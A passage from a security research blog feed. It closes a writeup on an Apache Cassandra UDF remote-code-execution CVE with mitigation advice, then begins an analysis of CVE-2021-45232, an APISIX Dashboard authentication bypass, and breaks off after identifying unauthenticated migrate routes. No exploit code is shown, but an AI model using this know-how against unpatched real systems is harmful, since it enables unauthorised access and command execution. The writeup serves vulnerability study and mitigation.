 comparatorSet = {ValueComparators@7924} 
argumentNames = {ArrayList@7880}  size = 1
 0 = {ColumnIdentifier@7919} &quot;name&quot;
functionName = &quot;exec&quot;
 value = {char[4]@7935} [e, x, e, c]
 hash = 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a0d10de9d419f332b06e2a9a714cacb1&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Moving forward it will go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java&lt;/code&gt; class to start performing the security checks using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isSecuredThread()&lt;/code&gt; that checks if the current thread is a secured thread. Now, Let’s disable the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_user_defined_functions_threads&lt;/code&gt; and see how the function will get executed while we debugging:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/b79ac406f5599c07cfd7ba73e46141f5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Then restart &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra&lt;/code&gt; and start to debug, When we start to debug it will do the same previous, But when we arrive here:&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/08a09c56a095c946e20c59996862b79f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;it’s checking if the current thread is running in a secured thread group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecurityThreadGroup&lt;/code&gt; and returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; if the thread has been previously initialized as secured or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; if it’s not running in a secured thread group or has not been initialized yet. But, In our case it will return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a9352fe96efeb55dd882e61616336e7a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here when it’s come to check if the thread results is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, Then it will throw execption tells us that access denied. But, This time will not as the the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; running as a daemon thread and we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;securityManager&lt;/code&gt; to null. As a results it will execute our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; successfully.&lt;/p&gt;

&lt;h1 id=&quot;mitigation&quot;&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;The vulnerability is only avlilable under the configurations we configure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra&lt;/code&gt; on, To mitigate this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE&lt;/code&gt; we have to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_user_defined_functions_threads&lt;/code&gt; option to true to prevent the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt; from running as a daemon thread &amp;amp; If you not using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; you better disable it. You can use this remedy script on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vsociety&lt;/code&gt; from here to help you with that.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Mitigation Video: https://ibb.co/GpQzPTd&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In a short way, We analyzed the vulnerability&amp;amp; the root-cause, The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashron&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecurityManager&lt;/code&gt; &amp;amp; more. We saw how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; created and executed &amp;amp; How under a certien configurations the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cassandra&lt;/code&gt; can be vulnerable for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE&lt;/code&gt;. Finally, How it could be used to bypass all the security implementations and achieve remote code execution on the target host.&lt;/p&gt;

&lt;h1 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/apache/cassandra/releases/tag/cassandra-4.0.0&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://cassandra.apache.org/doc/latest/cassandra/troubleshooting/use_tools.html&quot;&gt;https://cassandra.apache.org/doc/latest/cassandra/troubleshooting/use_tools.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://murukeshm.github.io/cassandra/3.11.3/development/ide.html&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://ant.apache.org/manual/install.html&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://cassandra.apache.org/_/index.html&quot;&gt;https://cassandra.apache.org/_/index.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://cassandra.apache.org/_/quickstart.html&quot;&gt;https://cassandra.apache.org/_/quickstart.html&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp;amp; Unauth-RCE</title><link href="http://localhost:5000/security%20research/CVE_2021_45232/" rel="alternate" type="text/html" title="CVE-2021-45232: Apache APISIX Dashboard Unauthorized Access &amp; Unauth-RCE" /><published>2023-05-09T00:00:00+08:00</published><updated>2023-05-09T00:00:00+08:00</updated><id>http://localhost:5000/security%20research/CVE_2021_45232</id><content type="html" xml:base="http://localhost:5000/security%20research/CVE_2021_45232/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Apache &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; Dashboard before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.10.1&lt;/code&gt; is vulnerable to Unauthorized Access Vulnerability known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2021-45232&lt;/code&gt;, The authentication middleware was developed based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;droplet&lt;/code&gt; framework. But, some &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APIs&lt;/code&gt; used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gin&lt;/code&gt; framework directly as a results it leads for a bypass in authentication &amp;amp; a successfully exploitation for this vulnerability let the attacker to abuse the support of executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lua&lt;/code&gt; script to execute commands on the server.&lt;/p&gt;

&lt;h1 id=&quot;what-is-apisix-&quot;&gt;&lt;strong&gt;What is APISIX ?&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Apache &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; is a cloud native API gateway that provides high-performance and scalable API management solutions. It is built on top of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nginx&lt;/code&gt; web server and provides a simple and flexible architecture for managing and securing APIs. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; Dashboard is a web based user interface for managing and monitoring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; instances. It provides an intuitive and easy-to-use interface for configuring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APIs&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;routes&lt;/code&gt;, as well as monitoring API usage and performance.&lt;/p&gt;

&lt;h1 id=&quot;testing-lab&quot;&gt;&lt;strong&gt;Testing Lab&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, It’s time to set up our lab for the analysis, I am going to use an older version for the analysis which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.9.0&lt;/code&gt; as it’s vulnerable. We can see that apache has an official repo on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;github&lt;/code&gt; to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt; and here we can avoid building errors and problems. First, Clone into the repo:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/apache/apisix-docker
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that, Navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example&lt;/code&gt; folder inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apisix-docker&lt;/code&gt; folder. Then, Open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; file and replace the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apisix-dashboard&lt;/code&gt; image with the following image:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apache/apisix-dashboard:2.9.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Full example :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: &quot;3&quot;

services:
  apisix-dashboard:
    image: apache/apisix-dashboard:2.9.0
    restart: always
    volumes:
    - ./dashboard_conf/conf.yaml:/usr/local/apisix-dashboard/conf/conf.yaml
    ports:
    - &quot;9000:9000&quot;
    networks:
      apisix:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example&lt;/code&gt; folder run the following command to start our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apisix&lt;/code&gt; on docker:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker-compose -p docker-apisix up -d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/505ef4cc887a271356a6fddf0f68ed20&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As it’s done let’s check the running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3636cc82b4dc0bbd5807ffe1568d6b2b&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Let’s test if it works &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[IP]:9000/&lt;/code&gt; for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt; dashboard &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[IP]:9080/&lt;/code&gt; for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APISIX&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Dashboard&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/fa88520f9d9ad3b9c839b571971c29bd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;APISIX&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/b7f32e78ee470c29efd891b0935dfb14&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;static-analysis&quot;&gt;&lt;strong&gt;Static Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api&lt;/code&gt; folder in the source code, We can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.go&lt;/code&gt; which is the start of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard&lt;/code&gt; app, By opening it we can see the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/919daf1cf398f86df286bb6908a18f7e&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can notice here it’s importing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; module from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manager-api&lt;/code&gt; package which is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; folder under the same folder, Then, It calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Execute()&lt;/code&gt; function from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt;. Therefore, We need to go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; folder and check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Execute()&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/b5598fa05e34465bd7a12cc962d0c10d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After going through the files we can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Execute()&lt;/code&gt; function is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.go&lt;/code&gt;. And basically, It’s executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootCmd.Execute()&lt;/code&gt; and check if there is any errors returned to handle it. When we search for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootCmd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ac8e582bbdc8df5ed1b53e61f1d92916&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see clearly that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootCmd&lt;/code&gt; is a variable definition of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLI&lt;/code&gt; from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cobra&lt;/code&gt; library which is a command-line library for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Go&lt;/code&gt; and It provides a simple &amp;amp; efficient way to create modern &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLI&lt;/code&gt; applications that can handle commands, flags, and arguments. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;cobra.Command&lt;/code&gt; function creates a new command with the specified options as the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Use&lt;/code&gt;: It’s a field specifies the name and usage of the command.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Short&lt;/code&gt;: It’s a field that provides a brief description of the command.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RunE&lt;/code&gt;: it’s field of a function that gets called when the command is executed, In our case the function it takes argument and gonna execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manageAPI()&lt;/code&gt; function.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we scroll down more under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Init()&lt;/code&gt; function, We can see the following lines:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d73c3c0987eb3bbb544b8803d16a07b4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see it’s adding persistent flags to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootCmd&lt;/code&gt; and registering several sub-commands (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Also can called functions&lt;/code&gt;) with it as the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newVersionCommand()&lt;/code&gt;: which adds a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version&lt;/code&gt; sub-command&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstallCommand()&lt;/code&gt;: which adds an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install&lt;/code&gt; sub-command&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newRemoveCommand()&lt;/code&gt;: which adds a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remove&lt;/code&gt; sub-command&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newStartCommand()&lt;/code&gt;: which adds a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;start&lt;/code&gt; sub-command&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newStopCommand()&lt;/code&gt;: which adds a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt; sub-command&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newStatusCommand()&lt;/code&gt;: which adds a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;status&lt;/code&gt; sub-command&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And all of these added sub-commands are added from the files under the same directory as we can see:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/b72368eead4b8ffbec827a02ed7b5b0d&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Let’s go to the function that gets executed when we running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootCmd&lt;/code&gt; which is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manageAPI()&lt;/code&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/39010f6d836a4ff7f6ef30e358161bb5&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Let’s explain the function. First, it initializes the configuration and logger by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conf.InitConf()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.InitLogger()&lt;/code&gt; functions. Then, it creates a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; object using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server.NewServer()&lt;/code&gt; function and assign it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; variable which is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; type and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;err&lt;/code&gt; variable for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;error&lt;/code&gt; &amp;amp; passing in options that include whether to force start the server or not. After that, The server is then started by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.Start()&lt;/code&gt; function, which creates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go routine&lt;/code&gt; and listens for incoming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; requests and then sets up a quit channel that listens for an interrupt signal and if received, it stops the server gracefully by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.Stop()&lt;/code&gt; function and exits the program &amp;amp; If an error occurs during server startup the function logs the error and returns it. Now, When we go up to the imports line we can notice the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7f6769d5fe6947573733e3d7c37169bf&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; is implemented from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api/internal/core/server/server.go&lt;/code&gt;. Let’s take a look on it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dca4cbab50da6e4e7a47c25857420937&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imports&lt;/code&gt; of needed modules, we can see it defines a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struct&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; type and it defines the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; server and its associated options. Then, The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Options&lt;/code&gt; struct is used to specify the configuration options for the server. After that a function named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NewServer&lt;/code&gt; that creates a new server manager by taking an instance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Options&lt;/code&gt; struct as input and return a pointer to a server struct and an error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/fcc23ab44efddcd0c705ed2415a2f41e&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the following lines, We can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start()&lt;/code&gt; function that called before inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mangerAPI()&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3038e7890589e1701dc3707d3caa8b38&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start()&lt;/code&gt; function starts with initializing the server through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.init()&lt;/code&gt; and assign the error to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;err&lt;/code&gt; object &amp;amp; if there is an error it will immediately assign it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;errSig&lt;/code&gt; and exit. Now, After the server initialized it will print server info using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.printInfo()&lt;/code&gt;, Then starts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; server through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.server.ListenAndServe()&lt;/code&gt; &amp;amp; Then it will start the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; Server implemented with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL&lt;/code&gt; if it’s configured. Moving to the following lines we will be able to see the following 2 functions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7c82758e4ef67c793b78bcb625ff6c0a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, Which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Stop()&lt;/code&gt; function and basically it will close the opened connections &amp;amp; then shutdown the server. And second, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init()&lt;/code&gt; function which is important for us, In the function it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.SetupStore()&lt;/code&gt; which is responsible for managing data persistence for the Manager API and it can be found in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store.go&lt;/code&gt; file under the same folder and it’s just initializing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Store&lt;/code&gt;. Second, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init()&lt;/code&gt; function also calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.setupAPI()&lt;/code&gt; and we can find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setupAPI()&lt;/code&gt; function inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.go&lt;/code&gt; file under the same folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/e9f7e9aa1636c4f5d0f1b4848c78b618&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;droplet&lt;/code&gt; framework is used, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;droplet.Option.Orchestrator&lt;/code&gt; function takes a slice of middleware and returns a new slice of middleware that will be used in the order specified. the first middleware in the slice of middleware passed in. Then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler.ErrorTransformMiddleware{}&lt;/code&gt; middleware that transforms all errors returned by handlers to the standard API error format. Finally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter.AuthenticationMiddleware{}&lt;/code&gt; middleware that authenticates requests based on the access token in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; header. and by defining the middleware in this way, it ensures that error transformation and authentication will be performed before any other middleware processing. So, for the following examples we gonna see how the wrong implementation done:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;1st:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/ee61b72beb2cd7765cfd947ed04c98ac&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;2nd:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/833ff9b6cb5dfe2956b4d3c11ce692d4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1st&lt;/code&gt; screenshot we can see that it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wgin.Wraps()&lt;/code&gt; to wrap the function with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;middleware&lt;/code&gt; so it can it check that error transformation and authentication will be performed before any other middleware processing. But, In the second screenshot it’s not wrapping the function with the middleware. As a result we can get unauthorized access to these 2 routes which are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/apisix/admin/migrate/export&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/apisix/admin/migrate/import&lt;/code&gt;. Let’s try to access a route from the wrapped ones and access the non-wrapped ones to se how the application will deal with it.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Wrapped&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/49d985af57ef25c7e1d39fda70fb9d3c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Non-Wrapped&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/7af5108642d39a96b9befec5c25323de&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

